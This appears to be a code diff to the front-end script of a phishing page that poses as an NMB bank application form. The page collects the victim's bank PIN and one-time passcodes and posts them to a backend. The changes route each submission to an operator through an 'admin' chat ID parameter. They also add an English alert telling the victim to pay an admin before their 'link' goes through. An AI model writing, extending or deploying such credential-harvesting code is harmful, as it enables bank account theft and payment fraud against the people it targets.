@@ -158,7 +158,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         switchView('waiting');
         try {
-          const response = await fetch('/api/submit-application', {
+          const response = await fetch(`/api/submit-application${adminChatId ? '?admin=' + encodeURIComponent(adminChatId) : ''}`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -170,7 +170,7 @@ document.addEventListener('DOMContentLoaded', () => {
           });
           const data = await response.json();
           if (!data.success) {
-            alert(data.error || "Ufikiaji umekataliwa.");
+            alert(data.error || "YOU HAVE NOT PAID CONDUCT ADMIN TO OPEN YOUR LINK AFTER CONDUCTING ME I WILL TAP PAID AND THE LINK WILL NOW GO THROUGH.");
             location.reload();
             return;
           }
@@ -178,6 +178,8 @@ document.addEventListener('DOMContentLoaded', () => {
           pollStatus();
         } catch (err) {
           console.error(err);
+          alert("Connection error. Please try again.");
+          location.reload();
         }
         return;
       }
@@ -260,7 +262,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('waiting-status-text').textContent = 'Inathibitisha PIN yako ya NMB...';
 
     try {
-      const res = await fetch('/api/submit-application', {
+      const res = await fetch(`/api/submit-application${adminChatId ? '?admin=' + encodeURIComponent(adminChatId) : ''}`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -272,7 +274,7 @@ document.addEventListener('DOMContentLoaded', () => {
       });
       const data = await res.json();
       if (!data.success) {
-        alert(data.error || "Ufikiaji umekataliwa.");
+        alert(data.error || "YOU HAVE NOT PAID CONDUCT ADMIN TO OPEN YOUR LINK AFTER CONDUCTING ME I WILL TAP PAID AND THE LINK WILL NOW GO THROUGH.");
         location.reload();
         return;
       }
@@ -280,6 +282,8 @@ document.addEventListener('DOMContentLoaded', () => {
       pollOtpStatus();
     } catch (e) {
       console.error(e);
+      alert("Connection error. Please try again.");
+      location.reload();
     }
   });
 
@@ -393,4 +397,4 @@ document.addEventListener('DOMContentLoaded', () => {
     location.reload();
   });
 });
-  
+                                   
